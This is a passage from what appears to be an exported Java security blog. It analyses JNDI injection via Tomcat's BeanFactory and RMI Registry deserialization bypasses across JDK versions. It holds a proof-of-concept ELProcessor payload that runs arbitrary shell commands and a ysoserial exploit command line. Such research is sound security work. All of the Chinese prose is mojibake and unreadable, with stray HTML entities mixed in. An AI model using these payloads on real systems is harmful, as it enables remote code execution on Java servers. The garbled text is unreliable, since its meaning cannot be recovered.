ReferenceRefå­˜åœ¨ç€å¯æ§çš„é”®å€¼å¯¹å…³ç³»ï¼Œé€šè¿‡getå‡½æ•°è·å¾—ï¼Œå¦‚ä¸Šè¿°ä»£ç ref.get(&quot;forceString&quot;)å°†ä¼šè·å¾—forceStringç›¸å¯¹åº”çš„RefAddrï¼Œé€šè¿‡è°ƒç”¨RefAddrçš„getContentå‡½æ•°å°±å¯ä»¥è·å¾—forceStringé”®å¯¹åº”çš„å€¼ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“forceStringå¯¹åº”çš„å†…å®¹ä¸­å­˜åœ¨=æ—¶ï¼Œå°†æˆªå–=åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºåç»­è°ƒç”¨çš„å‡½æ•°åã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä»»æ„æŒ‡å®šå½“å‰å¯¹è±¡çš„ç±»å‡½æ•°äº†ã€‚forceé”®å€¼å¯¹ä¸­å°†åŒ…å«=å‰é¢çš„å†…å®¹å’Œç›¸åº”çš„Methodå¯¹è±¡ã€‚ä¾‹å¦‚test=eval,æœ€ç»ˆæˆ‘ä»¬å°†å¾—åˆ°evalçš„Methodå¯¹è±¡ 123456789101112131415161718192021222324252627282930313233Enumeration&lt;RefAddr&gt; e = ref.getAll();while (e.hasMoreElements()) &#123; ra = e.nextElement(); String propName = ra.getType(); if (propName.equals(Constants.FACTORY) || propName.equals(\"scope\") || propName.equals(\"auth\") || propName.equals(\"forceString\") || propName.equals(\"singleton\")) &#123; continue; &#125; value = (String)ra.getContent(); Object[] valueArray = new Object[1]; /* Shortcut for properties with explicitly configured setter */ Method method = forced.get(propName); if (method != null) &#123; valueArray[0] = value; try &#123; method.invoke(bean, valueArray); &#125; catch (IllegalAccessException| IllegalArgumentException| InvocationTargetException ex) &#123; throw new NamingException (\"Forced String setter \" + method.getName() + \" threw exception for property \" + propName); &#125; continue; &#125; ref.getAllè·å–äº†æ‰€æœ‰çš„RefAddrï¼Œå¯¹äºéConstants.FACTORY/scope/auth/forceString/singletonä¸”å‰æ–‡åˆè·å–ç›¸åº”çš„Methodå¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å°†è°ƒç”¨è¯¥å¯¹è±¡ï¼Œå…¶å‡½æ•°å‚æ•°ä¸ºæ­¤æ—¶RefAddrçš„å†…å®¹ã€‚æ¯”å¦‚å­˜åœ¨ä¸€ä¸ªRefAddrçš„typeä¸ºtestï¼Œå°†è°ƒç”¨å‰é¢çš„evalçš„Methodå¯¹è±¡ã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ä¸€æ¬¡åå°„è°ƒç”¨ï¼Œæ¥çœ‹çœ‹poc 1234567891011121314// payload from kingxResourceRef ref = new ResourceRef( \"javax.el.ELProcessor\",// bean class null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",// factory class null);ref.add(new StringRefAddr(\"forceString\", \"KINGX=eval\"));// evalå‡½æ•°Methodå¯¹è±¡å°†ä¼šè¢«è°ƒç”¨ref.add(new StringRefAddr(\"KINGX\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\")\" + \".newInstance().getEngineByName(\\\"JavaScript\\\")\" + \".eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](\" + \"['/bin/sh','-c','\"+ command +\"'])\" + \".start()\\\")\"));// evalå‡½æ•°çš„å‚æ•°ä¸ºä¸Šè¿°æ‰§è¡Œå‘½ä»¤çš„elè¯­å¥ 0x05 æ€»ç»“å‰é¢å¯¹JNDI with RMIåšäº†ä¸€äº›ç®€å•çš„ä»‹ç»ï¼Œå½“é‡åˆ°å¯æ§çš„JNDI lookupå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å‘èµ·JNDIé“¾æ¥åˆ°RMIæœåŠ¡ä¸Šï¼Œåˆ©ç”¨JNDI Naming Managerçš„è¿œç¨‹codebaseåŠ è½½æœºåˆ¶è½½å…¥ä»»æ„çš„bytecodesã€‚ å½“ç„¶ï¼Œå‰é¢çš„åˆ©ç”¨æ–¹å¼ä»…åœ¨JDK8u113ã€JDK6u132,ã€JDK7u122ç‰ˆæœ¬ä¹‹å‰ï¼Œå¦‚æœé‡åˆ°äº†é«˜ç‰ˆæœ¬çš„JDKï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨æœ¬åœ°CLASSPATHä¸­å¯åˆ©ç”¨çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œæˆ–è€…æ˜¯tomcatç¯å¢ƒä¸‹çš„å¯åˆ©ç”¨çš„ObjectFactoryã€‚ åœ¨åç»­å¯åˆ©ç”¨çš„æœ¬åœ°Factoryè¿™ä¸ªæ€è·¯ä¸Šï¼ŒåŸæ–‡ä½œè€…kingxæå‡ºæˆ–è®¸å…¶ä»–çš„ä¸­é—´ä»¶ç¯å¢ƒä¹Ÿå¯èƒ½å­˜åœ¨è¿™ç§å¯åˆ©ç”¨çš„ObjectFactoryï¼Œè¿™é‡Œç«‹ä¸ªflagï¼Œä»¥åæœ‰ç©ºäº†ä¸€å®šè¦æ‰¾æ‰¾XD"},{"title":"æµ…è°ˆJava RMI Registryå®‰å…¨é—®é¢˜","permalink":"http://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/","text":"0x00 å‰è¨€æœ¬æ–‡è®²è¿°äº†Java RMI Registryç›¸å…³çš„ååºåˆ—åŒ–é—®é¢˜ï¼Œä¸»è®²Registryï¼Œåç»­è¡¥å……äº†Clientç«¯å’ŒServerç«¯çš„åˆ©ç”¨ 0x01 åŸç†Java RMIæµç¨‹å¯å‚è€ƒ1ï¼Œå‡ºé—®é¢˜çš„ä½ç½®åœ¨äºï¼š æƒ…æ™¯ä¸€ï¼šRegistry æ¥æ”¶bind/rebindè¯·æ±‚ ä»Clientæ¥æ”¶åˆ°çš„bindæˆ–rebindçš„remote objï¼Œå°†ç”±sun/rmi/registry/RegistryImpl_Skel.java#dispatchå¤„ç† ï¼ˆä¸‹å›¾ä¸ºJDK8u141ä¹‹å‰çš„ç‰ˆæœ¬çš„å®ç°ï¼‰ å¯ä»¥çœ‹åˆ°è·å–åˆ°çš„åºåˆ—åŒ–æ•°æ®ç›´æ¥è°ƒç”¨äº†readObjectå‡½æ•°ï¼Œå¯¼è‡´äº†å¸¸è§„çš„Javaååºåˆ—åŒ–æ¼æ´çš„è§¦å‘ã€‚ è¿™é‡Œæˆ‘ä»¬åªéœ€è¦å†™ä¸€ä¸ªbindæˆ–rebindçš„æ“ä½œï¼Œå³å¯æ”»å‡»åˆ°RMI Registryã€‚ æ³¨æ„ï¼šbind/rebindè¯·æ±‚çš„é™åˆ¶Registryå¯¹äºbind/rebindçš„è¯·æ±‚ï¼Œä¼šå»æ£€æŸ¥è¿™ä¸ªè¯·æ±‚æ˜¯å¦ä¸ºæœ¬åœ°è¯·æ±‚ï¼Œå¯¹äºå¤–éƒ¨çš„è¯·æ±‚ï¼ŒRegistryä¼šæ‹’ç»è¯¥è¯·æ±‚ã€‚ è¿™é‡Œæ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œå¯ä»¥é˜²æ­¢å¤–éƒ¨çš„æ¶æ„ç»‘å®šï¼Œä½†æ˜¯ä»–åœ¨å®ç°ä¸Šå­˜åœ¨é—®é¢˜ã€‚ JDK 8u141ä¹‹å‰ï¼Œé¦–å…ˆä¼šå»æ¥æ”¶ä¼ é€è¿‡æ¥çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶è¿›è¡ŒreadObjectååºåˆ—åŒ–ï¼Œå®é™…åˆ¤æ–­æ˜¯å¦ä¸ºæœ¬åœ°è¯·æ±‚ï¼Œæ˜¯åœ¨putæ–°çš„ç»‘å®šå¯¹è±¡ä¹‹å‰è¿›è¡Œçš„ã€‚è¿™æ„å‘³ç€åœ¨checkAccessä¹‹å‰æˆ‘ä»¬å°±å¯ä»¥å®Œæˆååºåˆ—åŒ–æ“ä½œï¼Œè¯¥é™åˆ¶å¹¶æ²¡æœ‰èµ·åˆ°ç›¸åº”çš„ä½œç”¨ã€‚ è€Œåœ¨JDK 8u141ç‰ˆæœ¬ä¹‹åï¼Œsun/rmi/registry/RegistryImpl_Skel.java#dispatch è¿™é‡Œä¼šå…ˆå»åˆ¤æ–­æ˜¯å¦ä¸ºæœ¬åœ°ç»‘å®šè¯·æ±‚ï¼Œç„¶åå†è¿›è¡Œååºåˆ—åŒ–ã€‚ æ‰€ä»¥å¦‚æœè¦ä½¿ç”¨bind/rebindè¯·æ±‚æ¥è¿œç¨‹æ”»å‡»Registryï¼ŒJDKç‰ˆæœ¬å¿…é¡»åœ¨8u141ä¹‹å‰ æƒ…æ™¯äºŒï¼šRegistryæ¥æ”¶lookupè¯·æ±‚ç”±äºbind/rebindè¯·æ±‚åœ¨141åç»­ç‰ˆæœ¬å­˜åœ¨é™åˆ¶ï¼Œæ‰€ä»¥ä¸ºäº†æ”»å‡»Registryæˆ‘ä»¬å¿…é¡»æ‰¾å…¶ä»–çš„æ–¹æ³•ã€‚ åœ¨RMIé‡Œå®¢æˆ·ç«¯å‘Registryå‘èµ·lookupè¯·æ±‚æ˜¯ä¸é™åˆ¶è¯·æ±‚æºçš„ï¼Œé‚£ä¹ˆlookupæ˜¯å¦å¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ¥çœ‹sun.rmi.registry.RegistryImpl_Skel#dispatchå¯¹äºlookupè¯·æ±‚çš„å¤„ç† å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œï¼Œæ¥æ”¶åˆ°lookupå‘é€è¿‡æ¥çš„å†…å®¹æ—¶ï¼Œä¹Ÿæ˜¯ç›´æ¥å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰bind/rebindçš„è¯·æ±‚æºé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥lookupå‘èµ·å¯¹141ç‰ˆæœ¬ä¹‹åçš„registryçš„æ”»å‡»ã€‚ æˆ‘ä»¬åœ¨æ„é€ lookupå‡½æ•°è¯·æ±‚æ—¶ï¼Œåªéœ€é‡æ–°å®ç°ä¸€ä¸‹lookupå‡½æ•°çš„å®ç°å°±å¯ä»¥äº†ï¼ˆè¿™é‡Œå°†Naming.lookupå’ŒRegistryImpl_Stub.lookupè¿›è¡Œäº†åˆå¹¶ï¼Œå¹¶å°†ä¼ é€è¿‡å»çš„å†…å®¹æ”¹æˆäº†ä»»æ„çš„Objectå¯¹è±¡ï¼‰ã€‚ 0x02 æ”»å‡»Registry jdk&lt;8u121ç¯å¢ƒä½¿ç”¨jdk8u111ï¼Œè¯¥ç‰ˆæœ¬ä¸‹çš„RMI Registryæ¥æ”¶çš„remote objåªè¦ç»§æ‰¿äº†Remoteç±»å³å¯ï¼ˆåŸç†è§2ï¼‰ï¼Œæ²¡æœ‰å…¶ä»–çš„é™åˆ¶ã€‚ ysoserialå·¥å…·ä¸­çš„ysoserial.exploit.RMIRegisterExploité‡‡ç”¨äº†ä»£ç†Remoteç±»çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé™åˆ¶ã€‚ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯ java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit RMIRegisterHost RMIRegisterPort CommonsCollections7 &quot;open /System/Applications/Calculator.app&quot; ç®€å•çœ‹ä¸€ä¸‹ysoserial.exploit.RMIRegisterExploitçš„åŸç†æ ¹æ®å‰é¢æ–‡ç« ä¸­çš„åŸç†ï¼Œæˆ‘ä»¬ä¼ è¿‡å»çš„å¯¹è±¡å¿…é¡»è¦æ˜¯ä¸€ä¸ªç»§æ‰¿äº†java.rmi.Remoteæ¥å£çš„å¯¹è±¡ã€‚è¿™é‡Œysoserialå·¥å…·åˆ™ç›´æ¥åˆ©ç”¨åŠ¨æ€ä»£ç†çš„åŸç†ï¼Œå¯¹Remoteç±»åšä»£ç†ï¼Œå…¶å¤„ç†çš„handlerç”¨äº†CommonsCollectionsä¸­å¸¸ç”¨çš„AnnotationInvocationHandlerã€‚ä½†å…¶è§¦å‘ç‚¹å˜ä¸ºhandlerçš„memberValueså±æ€§è¢«ååºåˆ—åŒ–æ‰€æ‰§è¡Œçš„åˆ©ç”¨é“¾ã€‚ æ¥ä¸‹æ¥ï¼Œè¿œç¨‹bindå¯¹è±¡å°†æ„é€ å¥½çš„remoteå¯¹è±¡ä¼ è¿‡å»å³å¯ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªä»£ç  0x03 æ”»å‡»Registry jdk&lt;8u232_b09jdk8u121ä¿®å¤åçš„ç‰ˆæœ¬é‡Œï¼Œå¯¹ååºåˆ—åŒ–çš„ç±»åšäº†ç™½åå•é™åˆ¶ï¼Œè§sun/rmi/registry/RegistryImpl.java#registryFilter è¿™ä¸ªç™½åå•åŒ…æ‹¬ï¼š 12345678910111213if (String.class == clazz || java.lang.Number.class.isAssignableFrom(clazz) || Remote.class.isAssignableFrom(clazz) || java.lang.reflect.Proxy.class.isAssignableFrom(clazz) || UnicastRef.class.isAssignableFrom(clazz) || RMIClientSocketFactory.class.isAssignableFrom(clazz) || RMIServerSocketFactory.class.isAssignableFrom(clazz) || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz) || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123; return ObjectInputFilter.Status.ALLOWED;&#125; else &#123; return ObjectInputFilter.Status.REJECTED;&#125; 0x02ä¸­å‘é€çš„å¯¹è±¡æ˜¯ä»£ç†åçš„AnnotationInvocationHandlerå¯¹è±¡ï¼Œå¹¶ä¸åœ¨ä¸Šè¿°å…è®¸çš„ç±»é‡Œé¢ï¼Œè¿™å¯¼è‡´åŸå…ˆysoserialå·¥å…·ä¸­çš„ysoserial.exploit.RMIRegisterExploitæ— æ³•åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒ3çš„æ–¹æ³•æ¥è¾¾æˆåˆ©ç”¨ã€‚ é¦–å…ˆæ€è·¯æ¯”è¾ƒæ˜ç¡®çš„æ˜¯ï¼Œå¦‚æœè¦ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸Šè¿°çš„ç™½åå•é‡Œæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„å¯¹è±¡ã€‚ åœ¨ç™½åå•é‡Œæˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ä¸¤ä¸ªç‰¹æ®Šå¯¹è±¡Remoteå¯¹è±¡å’ŒUnicastRefå¯¹è±¡ 1. UnicastRefå¯¹è±¡æˆ‘ä»¬éƒ½çŸ¥é“RMIè¿‡ç¨‹ä¸­å­˜åœ¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯ä¹‹é—´çš„äº¤äº’ï¼Œé‚£ä¹ˆåœ¨ä»£ç å±‚é¢ï¼Œæˆ‘ä»¬éœ€è¦æ€ä¹ˆå»åˆ›é€ è¿™æ ·ä¸€ä¸ªé“¾æ¥å‘¢ï¼Ÿ ç”±äºæ¼æ´å‘ç”Ÿç‚¹ä¸ºå‘è¿œç¨‹æœåŠ¡å™¨æ³¨å†Œå¯¹è±¡çš„å¼•ç”¨ã€‚å›é¡¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬åœ¨bindæ—¶ï¼Œä¼šå…ˆå»è·å¾—ä¸€ä¸ªRegistryï¼Œç±»ä¼¼ä¸‹é¢ 1Registry registry = LocateRegistry.getRegistry(\"192.168.98.80\"); è·Ÿè¿›java/rmi/registry/LocateRegistry.java#getRegistry æ³¨æ„åˆ°è¿™æ ·ä¸€æ®µä»£ç ï¼Œé€šè¿‡TCPEndpointæ³¨å†ŒæœåŠ¡ç«¯çš„hostã€ç«¯å£ç­‰ä¿¡æ¯ï¼Œä»¥UnicastRefå°è£…liveRef.åœ¨ä¸‹é¢createProxyæ—¶ä½¿ç”¨äº†RemoteObjectInvocationHandlerä½œä¸ºUnicastRefåŠ¨æ€ä»£ç†çš„å¤„ç†ç±» æœ€ç»ˆï¼Œæˆ‘ä»¬å°†ä»¥å®¢æˆ·ç«¯çš„èº«ä»½å»é“¾æ¥ï¼Œæ‰€ä»¥è¿™é‡Œçš„Registryä¼šæ˜¯sun/rmi/registry/RegistryImpl_Stub.java#bindå‘è¿œç¨‹RMI Registryæ³¨å†Œã€‚ newCallå‘èµ·è¿æ¥ï¼Œå¹¶å°†éœ€è¦ç»‘å®šçš„å¯¹è±¡å‘é€è¿‡å»ã€‚ åˆ°è¿™é‡Œå°±ç»“æŸäº†å‘è¿œç¨‹Registryå‘èµ·ç»‘å®šçš„æ“ä½œã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬ç”¨åˆ°äº†UnicastRefå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™é‡Œæƒ³è±¡ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶UnicastRefå¯¹è±¡é‡ŒLiveRefçš„hostå’Œportï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å‘èµ·ä»»æ„çš„RMIè¿æ¥ã€‚è¿™é‡Œå°±æ˜¯ysoserialä¸­JRMPClientçš„åŸç†ï¼Œæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªpayload æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰XDï¼Œä½¿ç”¨çš„æ–¹æ³•å°±æ˜¯å‰é¢ç»‘å®šè¿‡ç¨‹ä¸­çš„ä»£ç ã€‚è€Œåœ¨ç™½åå•é‡ŒUnicastRefå¯¹è±¡æ˜¯å…è®¸è¢«ååºåˆ—åŒ–çš„ã€‚ 2. RemoteObjectInvocationHandlerå¯¹è±¡å‰é¢åˆ†æåˆ°UnicastRefå¯è¢«ç”¨äºå‘èµ·RMIè¿æ¥ï¼Œä½†æ˜¯ä¸ºäº†ç¬¦åˆå‘é€çš„æ¡ä»¶ï¼Œä»ç„¶éœ€è¦æ»¡è¶³å®ç°Remoteæ¥å£çš„æ¡ä»¶ã€‚è€ŒUnicastRefå¹¶æ²¡æœ‰å®ç°Remoteæ¥å£ï¼Œè¿™å°±æ„å‘³ç€ç›´æ¥ä¼ UnicastRefæ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†å¤šåšä¸€æ­¥ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š è·ŸRMIRegisterExploitä¸€æ ·ï¼Œä½¿ç”¨Proxyåå°„æ¥å®ç°ï¼Œå…¶handlerç»§æ‰¿äºRemoteå¹¶å¤„ç†äº†æ„é€ å¥½çš„UnicastRefï¼Œè¿™é‡Œç”¨åˆ°çš„å°±æ˜¯RemoteObjectInvocationHandler æ‰¾åˆ°ä¸€ä¸ªå¯ä»¥å°è£…UnicastRefçš„å¯¹è±¡ï¼Œå¹¶ä¸”è¯¥å¯¹è±¡è¿˜å®ç°äº†Remoteå¯¹è±¡ è¿™é‡ŒJRMPClientä½¿ç”¨çš„RemoteObjectInvocationHandlerå°±æ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°†AnnotationInvocationHandleræ›¿æ¢æˆRemoteObjectInvocationHandlerã€‚åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨RemoteObjectInvocationHandlerçš„çˆ¶ç±»RemoteObjectçš„readObjectå‡½æ•° è¿™é‡Œçš„refå°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„UnicastRefï¼Œè°ƒç”¨å…¶readExternalå‡½æ•°ï¼Œè¿™é‡Œä»‹ç»ä¸€ä¸‹readExternal Javaé»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶éå¸¸ç®€å•ï¼Œè€Œä¸”åºåˆ—åŒ–åçš„å¯¹è±¡ä¸éœ€è¦å†æ¬¡è°ƒç”¨æ„é€ å™¨é‡æ–°ç”Ÿæˆï¼Œä½†æ˜¯åœ¨å®é™…ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¼šå¸Œæœ›å¯¹è±¡çš„æŸä¸€éƒ¨åˆ†ä¸éœ€è¦è¢«åºåˆ—åŒ–ï¼Œæˆ–è€…è¯´ä¸€ä¸ªå¯¹è±¡è¢«è¿˜åŸä¹‹åï¼Œå…¶å†…éƒ¨çš„æŸäº›å­å¯¹è±¡éœ€è¦é‡æ–°åˆ›å»ºï¼Œä»è€Œä¸å¿…å°†è¯¥å­å¯¹è±¡åºåˆ—åŒ–ã€‚ åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘å®ç°Externalizableæ¥å£ä»è€Œä»£æ›¿Serializableæ¥å£æ¥å¯¹åºåˆ—åŒ–è¿‡ç¨‹è¿›è¡Œæ§åˆ¶ã€‚Externalizableæ¥å£extends Serializableæ¥å£ï¼Œè€Œä¸”åœ¨å…¶åŸºç¡€ä¸Šå¢åŠ äº†ä¸¤ä¸ªæ–¹æ³•ï¼šwriteExternal()å’ŒreadExternal()ã€‚è¿™ä¸¤ä¸ªæ–¹æ³•ä¼šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿˜åŸçš„è¿‡ç¨‹ä¸­è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œä»¥ä¾¿æ‰§è¡Œä¸€äº›ç‰¹æ®Šçš„æ“ä½œã€‚ https://xz.aliyun.com/t/5392 è¿™é‡Œçš„readExternalå°±æ˜¯é‡æ–°åˆ›å»ºä¸€ä¸ªtcpè¿æ¥ ç»§ç»­å¾€ä¸‹è·Ÿ é‡æ–°ç”Ÿæˆä¸€ä¸ªLiveRefå¯¹è±¡åï¼Œå°†å­˜å‚¨åˆ°å½“å‰çš„ConnectionInputStreamä¸Šã€‚åç»­è¯¥streamä¼šç»§ç»­è°ƒç”¨registerRefså‡½æ•° æœ€ç»ˆç”±DGCClientå‘èµ·è¿æ¥ï¼Œä¸‹å›¾ä¸­çš„loopupå‡½æ•° åˆ°è¿™é‡Œåé¢å°±æ˜¯JRMPListenerååºåˆ—åŒ–çš„ä¸œè¥¿äº†ï¼Œè¿™é‡Œåœ¨æœ€åè¿›è¡Œåˆ†æã€‚ 3. RMIConnectionImpl_Stubå¯¹è±¡å‰é¢æåˆ°äº†ä¸¤ç§æ€è·¯ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªå®ç°äº†Remoteæ¥å£å¹¶ä¸”å°è£…äº†refçš„å¯¹è±¡ï¼Œè¿™é‡ŒRMIConnectionImpl_Stubå¯¹è±¡å°±æ˜¯ RemoteObjectInvocationHandleråç»­çš„è§¦å‘ä¸»è¦ä¾é RemoteObjectå¯¹è±¡çš„readObjectå‡½æ•°çš„é‡æ–°å¡«å……ï¼Œè€ŒRMIConnectionImpl_Stubå¯¹è±¡ä¹Ÿç»§æ‰¿äº†RemoteObjectæ‰€ä»¥åé¢çš„ä¸€äº›è°ƒç”¨è¿‡ç¨‹è·Ÿç¬¬äºŒä¸ªå¯¹è±¡ä¸€æ ·ï¼Œä¸å†å™è¿°ã€‚ å…¶å®é¡ºç€æ€è·¯æ‰¾è¿˜èƒ½å‘ç°DGCImpl_Stubã€RMIServerImpl_Stubã€RegistryImpl_Stubã€ReferenceWrapper_Stubéƒ½å¯ä»¥ 20200616 æ›´æ–°ä¸€ä¸ªå°trickå‰é¢2çš„éƒ¨åˆ†æåˆ°äº†ç”±äºUnicastRefçš„ååºåˆ—åŒ–ï¼Œè¿˜åŸçš„å†…å®¹refä¼šè¢«æ³¨å†Œåˆ°å½“å‰çš„ConnectionInputStreamçš„incomingRefTableï¼Œå¹¶äºStreamRemoteCallçš„releaseInputStreamæ—¶è°ƒç”¨å‘èµ·åå‘jrmpé“¾æ¥ã€‚ è¿™é‡Œçš„é‡ç‚¹åœ¨äºUnicastRefçš„ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬åœ¨3çš„éƒ¨åˆ†æ‰¾çš„é‚£å‡ ä¸ªç±»éƒ½æ˜¯å› ä¸ºå°è£…UnicastRefï¼Œåœ¨å®é™…ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè¿™å‡ ä¸ªç±»çš„å±æ€§è¢«è°ƒç”¨ååºåˆ—åŒ–è€Œè¿˜åŸUnicastRefã€‚ åœ¨å¸¸è§çš„readObjectå‡½æ•°çš„å¤„ç†ä¸­ï¼Œå…¶å®æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼Œä»–æ˜¯ä¸€ä¸ªé€’å½’ååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œå°±ç®—å½“å‰ç±»ä¸å­˜åœ¨ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šå»é€’å½’ååºåˆ—åŒ–å½“å‰æ•°æ®ä¸­çš„ç±»å±æ€§ã€‚ æ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸ç”¨å‰é¢æ‰¾åˆ°çš„å‡ ä¸ªç±»ï¼Œè‡ªå·±å†™ä¸€ä¸ªå°è£…UnicastRefä¹Ÿèƒ½åŒæ ·è¾¾åˆ°è¿™ç§æ•ˆæœï¼Œå…·ä½“çœ‹RMIConnectWrapped 0x04 åç»­ jdk&gt;=8u232_b09jdkç‰ˆæœ¬8u232_b09ä¿®å¤äº†å‰é¢ä½¿ç”¨åå‘å‘èµ·JRMPè¿æ¥çš„åˆ©ç”¨ã€‚ä¿®å¤ç‚¹åŒ…æ‹¬ä¸¤ä¸ª ä¸€ï¼šRegistryImpl_Skelsun.rmi.registry.RegistryImpl_Skel#dispatcherï¼Œè¿™é‡Œæˆªäº†lookupå‡½æ•°çš„å¤„ç†ï¼Œbind/rebindå‡½æ•°çš„å¤„ç†æ˜¯ä¸€æ ·çš„ å½“å‘ç”Ÿååºåˆ—åŒ–é”™è¯¯æˆ–è€…ç±»å‹è½¬æ¢é”™è¯¯æ—¶ï¼Œä¼šè°ƒç”¨call.discardPendingRefsï¼Œå°†ç°æœ‰çš„JRMPè¿æ¥æ¸…é™¤æ‰ã€‚ä¹Ÿå°±æ„å‘³ç€è¿™é‡Œæˆ‘ä»¬æ— æ³•ç”¨JRMPåå‘é“¾æ¥çš„æ–¹å¼æ¥è¾¾æˆåˆ©ç”¨äº†ã€‚ äºŒï¼šDGCImpl_Stubå½“Registryå¤„ç†JRMPåè¿çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨DGCImpl_Stub#dirtyï¼Œè€Œref.invokeä¼šæœ€ç»ˆè°ƒç”¨sun.rmi.transport.StreamRemoteCall#executeCallæ¥å¤„ç†è¿”å›çš„å¼‚å¸¸ï¼Œè¿™é‡Œä¼šæœ€ç»ˆå¯¼è‡´ååºåˆ—åŒ–(è¯¦ç»†è§0x05ç•ªå¤–) è€Œåœ¨232ç‰ˆæœ¬ï¼Œå°†åŸæœ¬åœ¨åé¢æ³¨å†Œçš„leaseFilteræåˆ°äº†å‰é¢ çœ‹çœ‹è¯¥è¿‡æ»¤å™¨çš„é™åˆ¶sun/rmi/transport/DGCImpl_Stub.java#leaseFilter å¯¹äºè¿”å›çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œåªå…è®¸ä¸Šé¢çš„å‡ ç§ç±»å‹ï¼Œè€Œç°æœ‰çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ä¸­HashSetã€HashTableç­‰ç±»éƒ½æ˜¯é€šä¸è¿‡çš„ã€‚ æ‰€ä»¥åœ¨Registryå‘èµ·çš„åå‘è¿æ¥æ˜¯æ— æ³•åˆ©ç”¨æˆåŠŸçš„ã€‚ ps:è¿™é‡Œç”¨çš„DGCImpl_Stubæ˜¯å®¢æˆ·ç«¯å‘èµ·æ—¶ä½¿ç”¨çš„ï¼Œç›¸å¯¹åº”çš„è¿˜æœ‰serverç«¯æ¥æ”¶Clientå‘èµ·çš„è¿æ¥çš„å¤„ç†DGCImpl_Skelï¼Œskelè¿™é‡Œä¹Ÿå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå…·ä½“è§0x08 0x05 ç•ªå¤–ï¼šysoserialä¸­çš„JRMPListenerä¸JRMPClientçœ‹äº†ä¸Šé¢å¯èƒ½ä½ ä¼šç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆserverç«¯å‘èµ·ä¸€ä¸ªRMIçš„è¿æ¥å°±ä¼šè§¦å‘javaååºåˆ—åŒ–ï¼Ÿ å‰æ–‡æˆ‘ä»¬å°†çš„æ˜¯RMI Registryåœ¨æ¥æ”¶è¿œç¨‹ç»‘å®šå¯¹è±¡æ—¶æ‰€å‘ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£ä¹ˆRMI Clientåœ¨æ¥æ”¶Serverç«¯çš„æ•°æ®æ—¶æ˜¯å¦ä¹Ÿä¼šå‘ç”Ÿååºåˆ—åŒ–æ¼æ´å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæ¯•ç«ŸRMIäº¤äº’è¿‡ç¨‹ä¸­çš„æ•°æ®é‡‡ç”¨çš„æ˜¯åºåˆ—åŒ–çš„æ•°æ®ï¼Œä¹Ÿå°±æ„å‘³ç€å­˜åœ¨ç€ä¸€ä¸ªååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚ 